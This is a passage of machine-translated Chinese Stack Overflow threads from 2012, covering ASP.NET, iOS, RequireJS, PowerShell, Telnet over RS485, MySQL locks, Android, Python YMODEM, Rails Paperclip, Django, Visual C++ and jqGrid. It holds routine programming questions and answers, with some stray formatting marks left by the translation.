        id += " - " + ctl.Txt1.ClientID;
        ctl.Txt1.Text = id;
        base.OnPreRender(e);
    } 
    ```

6.  浏览页面，你会看到`txt1 - txt1`

7.  如果您将框架更改为 .Net4，并使用`clientIDMode="AutoID"`，结果将是`txt1 - ctl00_MainContent_ctl00_txt1`

通常clientID如果添加到另一个容器应该添加前缀，但是为什么这里clientID没有改变？

我只是想知道这是设计使然还是只是一个错误。谢谢。

# ipad - presentModalViewController

> ID：12839477
> 
> 赞同：0
> 
> 时间：2012-10-11T12:25:02.320
> 
> 标签：ipad, presentmodalviewcontroller

我在 splitview 上使用 presentModalViewController。我现在的问题是，我对拆分视图的视图是横向视图，但我的视图总是更改为另一个视图。我可以查看当前的 Ipad 视图吗？

我将它用于 presentModalViewController：

```
MyTest *test = [[MyTest alloc] initWithNibName:@"MyTestNib" bundle:nil];//[[MyTest alloc]init];
   [test setModalTransitionStyle:UIModalTransitionStyleFlipHorizontal];
   //  [test setModalTransitionStyle:UIModalTransitionStyleCrossDissolve];
   // [test setModalTransitionStyle:UIModalTransitionStylePartialCurl];
    [self presentModalViewController:test animated:YES]; 
```

感谢你

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-24T10:36:36.623

你不应该使用 presentModalViewController，这在 iOS6.0 中已被弃用

# requirejs - 依赖关系未定义 - RequireJS

> ID：12839478
> 
> 赞同：2
> 
> 时间：2012-10-11T12:25:11.100
> 
> 标签：requirejs

我正在尝试将 OpenLayers 库与 RequireJS 一起使用。

问题是，OpenLayers 一直处于“未定义”状态，即使它被列为我的模块的唯一依赖项：

```
define(['OpenLayers'],function (OpenLayers) {
   console.log(OpenLayers);
}); 
```

这将打印“未定义”。

如果我用 jquery 替换 OpenLayers（两个 .js 文件都在同一个文件夹中），它将不再是未定义的。

那么为什么 RequireJS 没有加载 OpenLayers 呢？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-11T13:56:07.147

这段代码对我有用：

```
require.config({
    shim: {
        OpenLayers: {
            exports: 'OpenLayers'
        }
    }
});

require(['OpenLayers'], function(OpenLayers) {
    console.log(OpenLayers);
}); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-01-24T17:08:31.177

我对 Backbone.Marionette 也有同样的问题。添加`'marionette': { exports: 'Marionette' }`到`shim`对象工作。

[由于以下原因（来自RequireJS 文档](http://requirejs.org/docs/api.html#config-shim)），此`shim`添加适用于 OpenLayers 和 Marionette ：

> shim：为旧的、传统的“浏览器全局”脚本配置依赖项和导出，这些脚本**不使用 define()**来声明依赖项并设置模块值。示例（RequireJS 2.1.0+）：

```
requirejs.config({
    shim: {
        'backbone': {
            //These script dependencies should be loaded before loading
            //backbone.js
            deps: ['underscore', 'jquery'],
            //Once loaded, use the global 'Backbone' as the
            //module value.
            exports: 'Backbone'
        } 
```

# powershell - Powershell 将空字符串视为等效于 switch 语句中的 null 而不是 if 语句

> ID：12839479
> 
> 赞同：7
> 
> 时间：2012-10-11T12:25:13.960
> 
> 标签：powershell, null

请告诉我，我的代码中有一个细微的错误，这实际上不是 Powershell 的操作方式。

```
$in = ""

if ($in -ne $null)
{
    switch ($in)
    {
        $null { echo "This is impossible" }
        default { echo "out here!"  }
    }
} 
```

所有好的，诚实的逻辑都说这个脚本永远不应该打印出“**这是不可能的**”。但是，如果 $in 是一个空字符串，它确实如此。所以在 Powershell 中，空字符串和字符串*在*`null`语句中被认为是等价的，但在*语句**中却不是*。这*非常令人*困惑，也是许多人回避使用 Powershell 的主要原因之一。*`switch``if`*

 *谁能告诉我为什么会这样？有谁知道switch在幕后实际上在做什么？它当然不是直接进行-eq 比较。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-06T02:33:15.773

Powershell 自动将 $null 转换为空字符串。因此，在 .NET API 调用上使用 $null 时，Powershell 实际上将其转换为空字符串。要在 API 调用中传递实际的空值，请改用 [NullString]::Value。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-11T13:22:53.390

我认为是 powershell 2.0 的一个错误（这里有一些关于[MSFT Connect](https://connect.microsoft.com/feedback/ViewFeedback.aspx?FeedbackID=307821&SiteID=99)的信息）。

我可以说在 v 3.0 中你的代码返回`out here!`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-03-17T19:03:29.350

以下语句表明它`$null`不等同于 switch 语句中的空字符串。

```
$a=""; switch ($a){$null {"null"} "" {"empty string"}}

$a=$null; switch ($a){$null {"null"} "" {"empty string"}} 
```*

# c - 半双工通信链路上的 Telnet - 协商参数

> ID：12839485
> 
> 赞同：4
> 
> 时间：2012-10-11T12:25:39.760
> 
> 标签：c, embedded, telnet, legacy, obsolete

我们的嵌入式系统需要一个 Telnet（串行）接口，由于硬件/遗留系统，它通过半双工链路 (RS485) 工作。是的，我知道——不，我们无法改变它，业界喜欢这样。

这样做的问题是，当我们向终端发送全屏文本时，用户可以按下按钮并将数据发送回线路。

Telnet 支持 IAC->GA (Go Ahead) 命令向用户终端发出信号，它**可以开始**发送数据，但是我读过的任何 RFC 中都没有关于告诉用户终端**停止**发送数据的信息，所以我们可以刷新屏幕。

不幸的是，1973 年以后的所有 RFC 都假定将使用 SGA（[Suppress Go Ahead](https://www.rfc-editor.org/rfc/rfc858)）模式，因此很少提及。不幸的是，似乎没有一个 RFC 或其他文档实际上涵盖了整个协议。

有没有人有任何信息/链接更完整地记录了 telnet 协议（或只是 Go Ahead 行为）？我意识到其中一些可能是写在带有绿色条纹的羊皮纸上；）

**重新编辑：为什么这个***编程*问题的“离题”结束？Telnet 是 OSI 模型的第 7 层，你知道...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T13:56:42.933

啊……RS-485……我记得很清楚！:-)

GA 定义已损坏（请参阅[https://www.rfc-editor.org/rfc/rfc596](https://www.rfc-editor.org/rfc/rfc596)），但对于串行线路实现应该没问题，因为没有数据包分解。

您要求的是“反向休息”：

> “反向中断”是一种方法，通过半双工路径连接到终端的计算机可以在先前放弃该路径后重新获得对该路径的控制以进行进一步的打字。

就其本质而言，“中断”（反向或其他）必须在半双工连接上处于带外，因为它需要能够随时发送。

*编辑：聊天产生的新信息：* 但是，如果您不希望中断实际传输（[RFC393](http://www.ietf.org/rfc/rfc0393 "RFC393")，反向中断案例“b”）*并且*带有继续令牌的一方不会切换硬件到“传输”模式，除非实际传输（在此模式下，即使没有发送数据，RS-485 也无法接收）*并且*偶尔的损坏/截断传输是可以容忍的*，并且*telnet 程序正确地实现了这种相当不寻常的极端情况，*然后*带内发送此代码可能是可以接受的。

我认为解决此问题的另一种方法是破解客户端 Telnet 程序，以定期向服务器发送“继续”数据包，即使它没有其他要发送的内容。这将允许服务器进行更新并作为回报做“继续”；它有点像“令牌环”。您甚至不必延迟——当收到“继续”时，发送所有待处理的数据（可能没有），然后返回“继续”。

**可能的替代解决方案：**

既然你也控制着 ser->ip 设备，为什么不在服务器和设备之间建立一个专门的协议呢？

*   服务器发送`STX data stream ETX`

*   客户端发送`STX data stream ETX`

*   毫不拖延地重复

如果任何一方的数据缓冲区中没有数据，那么它只是一`STX ETX`对有效地告诉另一方“继续”。如果对方在 250ms 内没有任何消息，则重新发送`ETX`

您甚至可以通过在检测到错误的情况下`STX data stream ETX CRC1 CRC2`使用`NAK`（而不是`STX ...`）回复来扩展它以进行错误检测，并导致重新传输整个最后一个数据包。

# php - PHP + MYSQL_locks .....请帮助......我被困在这个......？

> ID：12839487
> 
> 赞同：2
> 
> 时间：2012-10-11T12:25:41.407
> 
> 标签：php, mysql

我在 php 中创建了一个文件，并在此文件下编写了一个代码来锁定具有读取模式的表。在那个文件下面我写了一个插入操作到同一个表中，但是我们知道读锁只支持读操作，这意味着你只能查看表中的内容，但你不能修改它。它运行良好。

PROBLEM_EXIST_HERE：我在同一张表中创建了另一个包含相同插入操作的文件。这里我只写插入操作，而不是锁定代码。

在使用此文件之前，我使用（RUN）第一个文件（包含锁定+插入）操作，之后我在同一浏览器中打开新选项卡并运行第二个文件（仅包含插入操作）。

现在我们知道读锁已经固定在表上，那为什么还要进行插入操作呢？为什么它不会向我显示一个错误，说明该表处于 READ 锁定模式，因此无法更新？有谁知道如何解决这个问题？

1.  有谁知道如何知道一个表是否在 mysql db 中被锁定在读或写条件下？谁能告诉我这个的php代码？我已经搜索了一整天，但没有解决方案。请用简单的语言写出简单的解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T13:20:01.177

您的另一个查询正在等待很长时间才能解决锁定，以便可以执行它。目前，没有直接的方法放置任何计数器，用于检查查询是否超过某个时间阈值，则应将其杀死。[这里给出了一些间接的方式](https://stackoverflow.com/questions/2137084/setup-mysql-query-timeout)

没有直接的方法可以知道表是否被您锁定。有时 MySQL 在执行某些查询时也会锁定表。您可以通过触发以下查询来了解表是否已锁定。

```
SHOW OPEN TABLES FROM <database name> WHERE `table` = "<table_name>"; 
```

在此查询中，如果**`in_use`**列的值为**1** ，则表被**锁定**，如果**为 0** ，则**未锁定**。

**编辑**

还有另一种方法可以使用 Information_schema 的进程列表信息。

运行查询：

```
SELECT * FROM information_schema.`PROCESSLIST` WHERE db="<DB name>" AND command = "Query"; 
```

从结果中查看`"state"`消息列是什么？它会让你更深入地了解正在发生的事情。它还会为您提供查询 ID，您还可以通过**[它](http://dev.mysql.com/doc/refman/5.0/en/kill.html)**使用`KILL <Query ID>`. 但是为了做所有这些事情，你将需要与 MySQL 服务器建立新的连接。您还将了解运行查询的时间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T13:02:40.863

查看[LOCK TABLE](http://dev.mysql.com/doc/refman/5.5/en/lock-tables.html)的文档：

```
WRITE 锁通常比 READ 锁具有更高的优先级，以确保更新
尽快处理。这意味着如果一个会话获得 READ
锁，然后另一个会话请求写锁，随后的读锁请求
等到请求写锁的会话获得锁，然后
释放它。

```

对于 InnoDB 表，InnoDB 有一个[Lock Monitor](http://dev.mysql.com/doc/refman/5.0/en/innodb-monitors.html)：

```
InnoDB Lock Monitor 与标准 Monitor 类似，但也提供了广泛的锁
信息。要启用此监视器以进行定期输出，请创建一个名为
innodb_lock_monitor。

```

更多的：

```
Lock Monitor 与标准 Monitor 相同，只是它包括额外的
锁定信息。通过创建关联来启用任一监视器的定期输出
InnoDB 表打开相同的输出流，但该流包含额外的
如果启用了锁定监视器的信息。例如，如果您创建 innodb_monitor
和 innodb_lock_monitor 表，打开单个输出流。流包括
额外的锁定信息，直到您通过删除
innodb_lock_monitor 表。

```

# javascript - 如何使用 JS/jQuery 对 setTimeout 设置的多个函数进行排队

> ID：12839488
> 
> 赞同：2
> 
> 时间：2012-10-11T12:25:41.340
> 
> 标签：javascript, jquery, task-queue

我有一个关于 JS 的工作流，它应该通过 setTimeout 函数一个一个地运行几个集合。如何使用 JS/jQuery 来做到这一点，最好以一些简单而美观的方式？

看起来像这样

```
function recursiveOne(arg1){
  if (allRight) return;

  doSomething();
  andAnotherOne();
  setTimeout(function(){recursiveOne(arg1)}, 3000);
}

function coreFunction(){
  recursiveOne(arg1);
  recursiveTwo(arg2);
  recursiveThree(arg3);
} 
```

其中 recursiveTwo 应该仅在 recursiveOne 已经完成最后一次迭代时才开始。

不好的部分是所有功能都通过 setTimeout 工作，因为我需要等待后端的反应，并且无法直接接收它 - 只能通过 HTML 源。

可能的解决方案，我可以看到：

*   下一个函数回调在上一个函数中正确传递。不太酷。
*   jQuery 延迟对象，它也不是那么漂亮，但更好一点。缺点是我仍然应该在我想以这种方式使用的每个函数中增加额外的延迟请求。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-11T12:29:41.903

您需要将函数作为回调发送

```
function recursiveOne(arg1, callback){
  if (allRight) callback();

  doSomething();
  andAnotherOne();
  setTimeout(function(){recursiveOne(arg1, callback)}, 3000);
}

function coreFunction(){
    recursiveOne(arg1, function(){
        recursiveTwo(arg2)
    });

} 
```

**（旁注）**我记得这个项目在做异步事情时帮助了我很多：

[https://github.com/caolan/async](https://github.com/caolan/async)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T12:49:53.240

您必须使用回调或`coreFunction`直接调用。您可以在下面找到一种使用函数数组的方法。

```
function recursiveOne(arg1){
   if(arg1 < 5){
      arg1++;
      setTimeout(function(){recursiveOne(arg1);}, 500);
   }else{
      console.log("func1 complete");
      coreFunction();
   }
}

function recursiveTwo(arg1){
   if(arg1 < 10){
      arg1++;
      setTimeout(function(){recursiveTwo(arg1);}, 500);
   }else{
      console.log("func2 complete");
      coreFunction();
   }
}

function recursiveThree(arg1){
    if(arg1 < 20){
      arg1++;
      setTimeout(function(){recursiveThree(arg1);}, 500);
   }else{
      console.log("func3 complete");
      coreFunction();
   }
} 

var funcSet = [recursiveOne, recursiveTwo, recursiveThree];
var funcArgs = [[1], [5], [10]];

function coreFunction(){
   if(funcSet.length){
       var func = funcSet.shift();
       func.apply(window, funcArgs.shift())
   }
}
coreFunction(); 
```

# android - 如何在首选项中存储 String[]

> ID：12839493
> 
> 赞同：0
> 
> 时间：2012-10-11T12:25:54.420
> 
> 标签：android, arrays, string, sharedpreferences

> **可能重复：**
> [SharedPreferences 中的字符串数组](https://stackoverflow.com/questions/6761885/array-of-strings-in-sharedpreferences)

我是 Android 的新手，想研究如何从 Preferences 中保存和检索 String[]。现在我有两个代码示例。这个是为了省钱

```
 void saveText() {
    sPref = getSharedPreferences("MyPref", MODE_PRIVATE);
    Editor ed = sPref.edit();
    ed.putString(SAVED_TEXT, position_name);
    ed.commit();
} 
```

和 position_name 作为 EditText 输入。首先，它应该保存在 String 数组中，然后保存在 Preferences 中的 String 数组中。对于加载，我有以下代码

```
 void loadText() {
    sPref = getSharedPreferences("MyPref", MODE_PRIVATE);
    String position_name = sPref.getString(SAVED_TEXT, "");
    bazar.add(new Bazar(position_name, R.drawable.unread));
} 
```

这两种方法都是静态的，但我希望它们能够处理动态字符串类型数据。简而言之，我输入一些数据，它应该存储在字符串数组中，然后字符串数组存储在首选项中，当我加载我的活动时，我希望检索那些存储的数据。尝试了不同的方法没有结果。你能帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T13:24:23.767

您可以使用 API 级别 11 和更高级别中的 SharedPreferences 存储字符串集。见`getStringSet()`和`putStringSet()`

在 11 之前的 API 级别中，您可以使用某种 hack。例如，如果您需要在键“stringArray”下存储字符串数组，则可以使用 putString 和键“stringArray.1”、“stringArray.2”等来保存数组中的每个字符串。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T13:35:06.423

您不能因为共享首选项仅支持原始变量，至少不能用于 api 11 下的任何内容。对于较低的内容，您可以做的是逐步遍历数组并将其单独放在此处[http://www.sherif .mobi/2012/05/string-arrays-and-object-arrays-in.html?m=1](http://www.sherif.mobi/2012/05/string-arrays-and-object-arrays-in.html?m=1)

我个人做的是序列化我猜想把它变成 0 和 1 的对象。然后你把它放在那里。您需要获得一个序列化类或自己制作一个 [将 ArrayList 保存到 SharedPreferences](https://stackoverflow.com/questions/7057845/save-arraylist-to-sharedpreferences)

可耻的是你。一个简单的搜索就会得到这些结果

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T13:37:11.460

通过 ,(comma) 分隔符将其保存为字符串，在获取时只需使用 split()

```
string str="";
str += "item1,";
.
. 
```

在 SharePreference 和 commit() 中设置 String str 要在数组中获得相同的结果：从 SharePreference 中获取 prefStr

```
String[] Array= prefStr.split(","); 
```

希望它会帮助你。

# android - 为现有文件设置内部读写属性

> ID：12839494
> 
> 赞同：1
> 
> 时间：2012-10-11T12:26:00.257
> 
> 标签：android, air, native, internal

我在本机应用程序中打开内部数据文件时遇到问题

指出我对 Android 开发相当陌生，但对编程并不陌生，这一点非常重要

设置

我有一个在 Android 设备上运行的移动 Air 应用程序。为了在应用程序中加载 PDF/播放视频，我编写了一个本机扩展程序来通过其本机应用程序加载文件。

问题

在测试应用程序时，我发现存储在外部存储中的文件加载正常，内部存储中的文件显示来自本机应用程序的消息，例如无法播放文件或无法打开文件。（内部存储中的文件被下载并保存在空中申请结束）。

这让我认为它是 Android 中的权限设置。

我知道内部存储中的文件默认是私有的

我已经阅读了如何使用 openFileOutput 写入设置其权限的文​​件，但由于文件已经存在，这将不起作用。我可以加载文件并再次将其吐出，但这并不理想，因为这可能会导致不必要的开销。

我不确定如何继续，我需要在 Air App 端设置清单属性吗？安卓应用端？双方？如果是的话，是哪一个，在哪里

或者他们是在运行时更改它的一种方法，我发现了 setReadable 函数，但它处于 API 级别 9 并且我的理想目标是略低于此。

任何帮助是极大的赞赏

```
public static void openFile( Activity parentActivity, String filePath, String fileType, String mimeType ) {

    //Create the file we are to create 
    File fileToOpen = new File(filePath);

    //Check if the file exists 
    if( fileToOpen.exists() ) {

        //The path of the file we want to open
        Uri path = Uri.fromFile(fileToOpen);

        //Create a new intent of the file we want to view
        Intent intent = new Intent(Intent.ACTION_VIEW);

        //Set the path and the mime type  for the file 
        intent.setDataAndType(path, mimeType);

        //Remove any other activities 
        intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);

        //Check that its within the try and catch block
        try {

            //Open the file by stating a new activity 
            parentActivity.startActivity(intent);            
        } 
        catch (ActivityNotFoundException e) {

            //Make a pop-up informing that we don't have an application to open the file
            Toast.makeText( parentActivity,"No Application Available to View " + fileType,Toast.LENGTH_SHORT).show();
        }

    } else {

        //Display an alert which will show that the file dosn't exist
        Toast.makeText( parentActivity, fileType+" file dosn't exist", Toast.LENGTH_SHORT).show();      
    }
} 
```

# python - 有人有 Python 的 YMODEM 包吗？

> ID：12839502
> 
> 赞同：3
> 
> 时间：2012-10-11T12:26:21.933
> 
> 标签：python, pypi, xmodem

我试图找到PyPi 中列出的包**调制解调器 1.0 ，因此想从中使用****ymodem**。[此链接http://pypi.python.org/pypi/modem](http://pypi.python.org/pypi/modem)中的包描述仅提供描述，而不是下载链接，这与此链接[http://pypi.python.org/pypi/xmodem/0.2.4](http://pypi.python.org/pypi/xmodem/0.2.4)不同。

有谁知道为 Python 下载调制解调器或 ymodem 包的位置？

请帮助我。

问候，

曼朱纳特·巴特

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2017-12-05T17:50:58.403

这是很老的，但我想我会回答它，因为我最近遇到了这个问题。

如果您使用的是 linux，则可以这样做，我在以下链接中找到：[https ://superuser.com/questions/604055/using-rz-and-sz-under-linux-shell](https://superuser.com/questions/604055/using-rz-and-sz-under-linux-shell)

使用以下代码编写一个名为 ysend 的文件：

```
#!/bin/sh

DEV=/dev/ttyUSB0

stty -F $DEV 115200
sb $1 > $DEV < $DEV 
```

其中 DEV 是您的串行接口，数字是您的波特率。sb 命令使用 YMODEM 协议。

然后，您可以使用以下代码从 python 调用此文件：

```
import subprocess
subprocess.call(["sudo","bash","ysend",filename]) 
```

其中 filename 是您要发送的文件。

经过数小时搜索 ymodem 实现后，这解决了我的所有问题。将 sb 更改为 sz 以使用 zmodem

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-06-14T21:30:01.217

它不在 repo 的主要分支中，乍一看我错过了它。

[https://github.com/tehmaze-labs/modem/tree/multi-protocol](https://github.com/tehmaze-labs/modem/tree/multi-protocol)

# ruby-on-rails-3 - 如何使用带有 image_tag 的回形针？

> ID：12839506
> 
> 赞同：0
> 
> 时间：2012-10-11T12:26:31.807
> 
> 标签：ruby-on-rails-3, paperclip

我一直在几个模型中使用 Paperclip 和我的应用程序，但以下问题给我带来了问题：

在模型中：

```
has_attached_file :image, :path => (Rails.root + "document_libraries/:id/filename").to_s, 
                          :url => "/document_libraries/:id" 
```

在视图中：

```
<%= image_tag(@document_library.image.url) if @document_library.image? %> 
```

这会在浏览器中显示“丢失的图像”图形。我在这里做错了什么？我的公共目录中没有图像。我有这个代码的不同模型，它完美地工作：

```
has_attached_file :file, :path => (Rails.root + "team_photos/:id/:filename").to_s,
                         :url => "/team_photos/:id"

image_tag(@team_photo.file.url) 
```

我检查了 document_libraries 文件夹是否存在于 rails 根目录中，并且我正在使用的特定记录存在实际的 jpg。权限与 team_photo 模型相同，可以正常工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:31:04.070

检查差异，`:`缺少一个

```
:path => (Rails.root + "document_libraries/:id/filename").to_s 
```

和

```
:path => (Rails.root + "team_photos/:id/:filename").to_s 
```

# python - 如何在 django 网站上使用 python 脚本

> ID：12839509
> 
> 赞同：0
> 
> 时间：2012-10-11T12:26:43.060
> 
> 标签：python, django, webpage

我是 Django 新手，但想学习它并且已经涵盖了 Django 网站上的几乎所有基础知识。这是我的问题：我编写了一个目前在 python shell 中工作的 python 脚本，但我想在我的 web 上使用该脚本。这样当用户访问我的网站并提供必要的输入时，点击提交，网页将输入链接到 python 脚本（已经有网页上的输入字段），并且 python 脚本根据给定的输入运行由用户对其进行评估并在网页上打印脚本的结果。请大家帮帮我，指望你们。但是请随意建议最能解决我的问题的其他框架。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T13:02:34.150

听起来您最好将脚本的内容移动到 django 视图中并在表单经过验证后执行它。

[https://docs.djangoproject.com/en/dev/topics/forms/?from=olddocs#using-a-form-in-a-view](https://docs.djangoproject.com/en/dev/topics/forms/?from=olddocs#using-a-form-in-a-view)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T13:06:54.360

在您看来，您可以使用请求对象获取表单数据。您可以将表单值传递给您的脚本并将输出发送到您的响应对象。

看来您并不完全了解 django 的工作原理。请再次阅读教程。

# android - 单击按钮会将列表项中按钮的可见性从不可见更改为可见

> ID：12839511
> 
> 赞同：1
> 
> 时间：2012-10-11T12:26:46.110
> 
> 标签：android, android-listview

![在此处输入图像描述](../Images/f92f8bf886ee6f7f42bfa23a63bb647d.png)

在列表项中，有一个“删除”按钮和文本视图。单击列表项中的删除按钮时，我正在删除该特定列表项。但我的问题是：删除按钮在开始时和用户单击时是不可见的在屏幕顶部下方显示的“编辑”按钮上，我想让所有按钮从不可见变为可见..但我不知道如何实现..

ListViewAdapter.java：

```
public class ListViewAdapter extends BaseAdapter {

    public ArrayList<String> list;
    Context context;
    private LayoutInflater mInflater;

    int count = 0;
    static int list_size;

    public ListViewAdapter(Context context, ArrayList<String> list) {
        super();
        this.context = context;
        this.list = list;
        mInflater = LayoutInflater.from(context);
        list_size = list.size();
    }

    public int getCount() {
        if (list == null) {
            return 0;
        } else {
            return list_size;
        }
    }

    @Override
    public Object getItem(int position) {
        Log.i("Calling getItem()", "getItem()");
        return list.get(position);
    }

    @Override
    public long getItemId(int position) {
        Log.i("Calling getItemId()", "getItemId()");
        return position;
    }

    static class ViewHolder {
        TextView notes_text;

        static Button delete;
    }

    //  @Override
    public View getView(int position, View convertView, ViewGroup parent) {
        Log.i("ListViewAdapter is calling...", "calling...");
        ViewHolder holder;
        Log.i("View to be converted", "" + convertView);
        if (convertView == null) {
            convertView = mInflater.inflate(R.layout.simplerow, null);
            Log.i("View to be converted", "" + convertView);
            holder = new ViewHolder();
            holder.notes_text = (TextView) convertView.findViewById(R.id.rowTextView);

            holder.delete = (Button) convertView.findViewById(R.id.btn_minus);

            convertView.setTag(holder);
        } else {
            holder = (ViewHolder) convertView.getTag();
        }

        holder.notes_text.setText((String) list.get(position));

        holder.delete.setTag((Integer) position);

        holder.delete.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View view) {
                Integer myIntegerObject = new Integer((Integer) view.getTag());
                Log.i("Integer postioton", "" + myIntegerObject.intValue());

                list.remove(list.indexOf(list.get(myIntegerObject.intValue())));

                list_size = list.size();

                notifyDataSetChanged();
            }
        });

        return convertView;
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-11T13:03:20.117

保留一个布尔标志以指示编辑模式。In将可见性设置为或取决于您的布尔标志`ListAdapter`。`getView()``Button``VISIBLE``GONE`

现在，要切换所有按钮的可见性，您需要更改布尔标志，并调用`notifyDataSetChanged()`适配器。这将重新绘制所有可见的列表项。

在适配器类中添加变量：

```
boolean editmode = false; 
```

在`getView()`：

```
holder.delete.setVisibility( (editmode ? View.VISIBLE : View.GONE ) ); 
```

最后为您的适配器类添加一个方法：

```
public void setEditMode(boolean value){
  editmode = value;
  this.notifyDataSetChanged();
} 
```

# c++ - visual c++，没有编译器优化的数字代码给出了错误的结果

> ID：12839513
> 
> 赞同：0
> 
> 时间：2012-10-11T12:26:50.917
> 
> 标签：c++, visual-c++, visual-c++-2010

我正面临 Visual C++ 编译器优化的奇怪情况。

在一个相当中等大小的 c++ 代码中，包含 10 个静态库，如果代码在优化为 On（/O1、/O2 或 /Ox）的情况下编译，则程序的运行会产生正确的输出。

但是，使用 /Od 时，程序会产生错误的输出。

我知道这个问题非常笼统，但我很欣赏任何线索可能是什么原因，或者它可能与什么相关联。

ps代码正在做有限元数值，很多浮点运算。ps 代码在 Visual Studio 2010 中。

编辑：代码的示例输出：

r（残差）的差异相当大

一**、无**优化：

```
Solver. time: 0.12, iteration: 1
Solver.
------------------------------------
determining values:
         dg.            0
         limit of dg.   0.897278
         dr.            7675.3
         limit of dr.   45.3704
         r.             7675.3
         limit of r.    453.704
         dx.            0.122164
         limit of dx.   8.97278e-005
------------------------------------ 
```

二、**优化**：

```
Solver. time: 0.12, iteration: 1
Solver.
------------------------------------
determining values:
         dg.            0
         limit of dg.   0.897278
         dr.            5894.53
         limit of dr.   45.3704
         r.             5894.53
         limit of r.    453.704
         dx.            0.122164
         limit of dx.   8.97278e-005
------------------------------------ 
```

ps我无法提供代码本身的示例，bcs确实不知道问题出在代码的哪里。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T17:26:23.517

该错误被发现，它是一个**未初始化的变量**，看起来像已初始化！*我在数值*库中定义了一个（双）常数*kInfinity*值。其他库（*fem*等，它们非常依赖于*numerics*库）在程序开始时从*numerics库中**获取*此值，以便稍后通过程序运行使用此值。问题是他们首先在数值库中初始化之前获取了这个值*（*这**就像**一场比赛。）

 *****现在是有趣的部分：

*   如果不进行优化，编译器会将未初始化的变量设置为“零”（这是众所周知的行为。）如果在“线性弹性材料模型”中将该值用作“屈服应力”，则表示非物理材料，即代码未能产生有趣的输出。

*   通过优化，编译器将未初始化的变量设置为“随机”（在我的情况下非常大）数字。如果在“线弹性材料模型”中将该值用作“屈服应力”，则完美表示线弹性材料（相当物理）。

这就解释了为什么通过优化我的代码有效，但并非没有。

感谢所有的回复和分享想法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:32:23.300

很难说，但优化可以例如删除一些算术表达式并放入“优化”的表达式。通过修改包含加法、乘法等运算的算术表达式，结果会受到影响。你可以有溢出，精度损失，......*****

# jquery-ui - 无法在子网格中选择行：Jqgrid

> ID：12839514
> 
> 赞同：0
> 
> 时间：2012-10-11T12:27:03.533
> 
> 标签：jquery-ui, jquery, jquery-plugins, jqgrid

我正在使用 jqgrid，并在其中添加了一个子网格，如下所示，

![在此处输入图像描述](../Images/406a2bcec5edc716a2aaeafbdd631a3f.png)

如您所见，
具有 11 和 13 列的行是主网格行

并且每一行都有感兴趣的子网格，添加记录元素显示为子网格添加弹出窗口

这是 subgrid 的代码，

```
subGridRowExpanded: function(subgrid_id, row_id) {
            var subgrid_table_id, pager_id;
            subgrid_table_id = subgrid_id+"_t";
            pager_id = "p_"+subgrid_table_id;
            $("#"+subgrid_id).html("<table id='"+subgrid_table_id+"' class='scroll'></table><div id='"+pager_id+"' class='scroll'></div>");
            jQuery("#"+subgrid_table_id).jqGrid({
                url:"shops?q=2&ShopID="+row_id,
                datatype: "xml",
                colNames: ['Interest'],
                colModel: [
                    //{name:"Id",index:"ShopID",width:80,editable:false,editoptions:{readonly:false,size:40}}, //Shop ID not required
                    {name:"id",index:"id",editable:true,edittype:"select",editoptions:{dataUrl:'shops?q=3&ShopID='+row_id},editrules:{required:true}}
                ],
                rowNum:10,
                pager: pager_id,
                width: '100%',
                height: '100%',
                scrollOffset: 0,
                sortname: 'num',
                sortorder: "asc",
                height: '100%',
                editurl:'shops?q=5&ShopID='+row_id
            });
            jQuery("#"+subgrid_table_id).jqGrid('navGrid',"#"+pager_id,{edit:false,add:true,del:true})
        },
        subGridRowColapsed: function(subgrid_id, row_id) {
            // this function is called before removing the data
            //var subgrid_table_id;
            //subgrid_table_id = subgrid_id+"_t";
            //jQuery("#"+subgrid_table_id).remove();
        } 
```

问题是，当 subgrid 中有多个元素时，我可以选择它（我使用最新版本的 Chrome）但是当 subgrid 中只有一个元素时，我可以选择它（如果您注意到颜色差异，请参阅 subgrid element 'Gifts' - 在第 13 行下方选择），一旦选择，'Gifts' 可以被删除。

**更新：** 在 firefox 和 IE 中，只有第一行从子网格中选择

代码有问题吗？为什么子网格中有多个元素时我不能选择单个元素？

感谢您的时间，谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:50:31.123

我想你有 id 重复的问题。HTML 不允许`id`在相同的 HTML 页面上使用具有相同值的属性。所有`id`属性的值**必须是唯一的**。我建议您使用 Chrome/IE 的开发者工具或使用 Firebug 来验证您是否有问题。您只需检查`id`您现在在`<tr>`网格和子网格的元素上拥有的属性。

另一方面，jqGrid 的*所有行*（所有`<tr>`元素）都成为`id`分配的属性。通常您必须`id`在响应中填写服务器端的`url`. 问题是一个人通常使用`id`来自数据库的值，但您通常`id`只*在数据库的一个表*上而不是在数据库上的所有表上具有唯一性。因此，您可以轻松地遇到多个 jqGrid（或带有 subrird 的网格）获取具有 id 重复的行的情况。

